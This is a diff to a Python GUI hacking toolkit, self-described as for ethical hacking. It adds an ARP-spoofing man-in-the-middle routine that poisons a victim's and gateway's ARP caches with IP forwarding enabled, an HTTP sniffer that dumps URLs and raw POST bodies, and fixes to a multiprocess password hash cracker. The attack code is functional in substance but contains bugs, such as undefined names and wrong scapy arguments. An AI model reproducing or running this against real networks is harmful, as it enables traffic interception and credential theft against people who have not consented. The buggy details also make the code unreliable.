@@ -1,12 +1,11 @@
-import os, configparser, sys, time
+import os, configparser, sys, time, math, hashlib, multiprocessing, argparse
 from tkinter import *
-import hashlib
-import time
-import multiprocessing
-import math
 from scapy.all import *
-import mitm.Python
 import packetsniffer
+from scapy.layers.http import HTTPRequest  # import HTTP packet
+from scapy.layers.inet import IP
+from colorama import init, Fore  # Color for HTTP requests
+
 #Ethical Hacking Python Application
 
 #variable declations
@@ -19,7 +18,69 @@ import packetsniffer
 
     
 #MitM Section
+'''
+try:
+	interface = raw_input ("Enter Interface: ")
+	victimIP = raw_input ("Enter Victim IP: ")
+	gatewayIP = raw_input ("Enter Gateway IP: ")
+except KeyboardInterrupt:
+	print("\n[*] Exiting...")
+	sys.exit(1)
+'''
+print("\n[*] IP Fowarding enabled \n")
+os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
+#send ARP requests
+def get_mac(IP):
+	conf.verb = 0
+	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP, timeout = 2,
+	intface = textInterface, inter = 0.1))
+	for snd, rcv in ans:
+		return rcv.sprintf(r"Ether.src%")
+			
+#restore ARP	
+def restoreARP():
+	print("\n Restoring Target")
+	victimMAC = get_mac(textVictimIP)
+	gatewayMAC = get_mac(textRouterIP)
+	send(ARP(op = 2, pdst = textRouterIP, psrc = textVictimIP, hwdst = "ff:ff:ff:ff:ff:ff",
+	hwsrc = victimMac), count = 7)
+	print("Disabling IP Forwarding")
+	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+	print("Exiting")
+	sys.exit(1)
+		
+		
+#ARP reply, switch
+def switch(gatewMAC, victimMAC):
+	send(ARP(op = 2, pdst = textVictimIP, psrc = textRouterIP, hwdst = victimMAC))
+	send(ARP(op = 2, pdst = textRouterIP, psrc = textVictimIP, hwdst = gatewMAC))
+		
+#MITM
+
+def mitm():
+	try:
+		victimMAC = get_mac(textVictimIP)
+	except Exception:
+		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+		print("Victim MAC not found!")
+		print("Exiting")
+		sys.exit(1)
+	try:
+		gatewayMAC = get_mac(textRouterIP)
+	except Exception:
+		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+		print("Gateway MAC not found")
+		print("Exiting")
+		sys.exit(1)
+	print("Poisoning Targets!")
+	while 1:
+		try:
+			switch(gatewayMAC, victimMAC)
+			time.sleep(1.5)
+		except KeyboardInterrupt:
+			reARP()
+			break
 
 
 
@@ -28,7 +89,48 @@ import packetsniffer
 
 
 #Packet Sniff
+init()
+GREEN = Fore.GREEN
+RED = Fore.RED
+RESET = Fore.RESET
 
+
+def sniff_packets(iface):
+    # Sniff 80 port packets with iface
+    if iface:
+        # port 80 for http
+        sniff(filter="port 80", prn=process_packet, iface=textInterface, store=False)
+    else:
+        # sniff with default interface
+        sniff(filter="port 80", prn=process_packet, store=False)
+
+
+def process_packet(packet):
+    # This function is executed whenever a packet is sniffed
+    if packet.haslayer(HTTPRequest):
+        # if this packet is an HTTP Request get the requested URL
+        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
+        # get the requester's IP Address
+        ip = packet[IP].src
+        # get the request method
+        method = packet[HTTPRequest].Method.decode()
+        print(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
+        if show_raw and packet.haslayer(Raw) and method == "POST":
+            # If the red flag shows, it will POST the raw data
+            print(f"\n{RED}[*] Some useful Raw data: {packet[Raw].load}{RESET}")
+
+
+if __name__ != "__main__":
+    pass
+else:
+    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer")
+    parser.add_argument("-i", "--iface")
+    parser.add_argument("--show-raw", dest="show_raw", action="store_true")
+    # parse arguments
+    args = parser.parse_args()
+    iface = args.iface
+    show_raw = args.show_raw
+    sniff_packets(textInterface)
 
 
 
@@ -124,7 +226,7 @@ def crack(hashed_password_list, cpu_number):
             number_of_cracked_passwords += 1
         if number_of_passwords_scanned % 1000 == 0:
             finish = time.perf_counter()
-            print("CPU {}: {}/{} password has been cracked. {} minutes elapsed.".format(cpu_number, number_of_cracked_passwords, len(hashed_password_list), round(finish-start)/60,2)))
+            print("CPU {}: {}/{} password has been cracked. {} minutes elapsed.".format(cpu_number, number_of_cracked_passwords, len(hashed_password_list), round(finish-start)/60,2))
 
 # executing codes with multiple cores cpus
 
@@ -141,47 +243,47 @@ if no_of_cpu == 2:
 
 elif no_of_cpu == 4:
     p1 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[0],"1"])
-	p2 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[1],"2"])
-	p3 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[2],"3"])
-	p4 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[3],"4"])
+    p2 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[1],"2"])
+    p3 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[2],"3"])
+    p4 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[3],"4"])
 
     p1.start()
-	p2.start()
-	p3.start()
-	p4.start()
+    p2.start()
+    p3.start()
+    p4.start()
 
-	p1.join() # waits until the process is completed
-	p2.join()
-	p3.join()
-	p4.join()
-	print("Cracking has been completed")
+    p1.join() # waits until the process is completed
+    p2.join()
+    p3.join()
+    p4.join()
+    print("Cracking has been completed")
 
 elif no_of_cpu == 6:
     p1 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[0],"1"])
-	p2 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[1],"2"])
-	p3 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[2],"3"])
-	p4 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[3],"4"])
+    p2 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[1],"2"])
+    p3 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[2],"3"])
+    p4 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[3],"4"])
     p5 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[3],"5"])
     p6 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[3],"6"])
 
     p1.start()
-	p2.start()
-	p3.start()
-	p4.start()
+    p2.start()
+    p3.start()
+    p4.start()
     p5.start()
     p6.start()
 
-	p1.join() # waits until the process is completed
-	p2.join()
-	p3.join()
-	p4.join()
+    p1.join() # waits until the process is completed
+    p2.join()
+    p3.join()
+    p4.join()
     p5.join()
     p6.join()
-	print("Cracking has been completed")    
+    print("Cracking has been completed")    
 
 else: 
     print("Error message: You have {} CPU. This code has been constructed for either 2 or 4 CPU.".format(no_of_cpu))
-	print("How to fix: Go to line 52-77. I have hardcoded the number of processors to run this. You'll just have to change the if-else statement to cater to your number of cpu.")
+    print("How to fix: Go to line 52-77. I have hardcoded the number of processors to run this. You'll just have to change the if-else statement to cater to your number of cpu.")
 
 
 
@@ -230,7 +332,9 @@ buttonPacketSniffer.grid(column=2,row=0)
 buttonPacketProcessor = Button(window,text="Engage Packet Processor",command=process_packets(packet))
 buttonPacketProcessor.grid(column=2,row=1)
 
-#Button for handling
+#Button for handling restoreARP() call
+buttonRestoreARP = Button(window,text="Restore ARP",command=restoreARP())
+buttonRestoreARP.grid(column=2,row=1)
 
 #Button for closing the application
 buttonClose= Button(window,text="Quit",command="close")
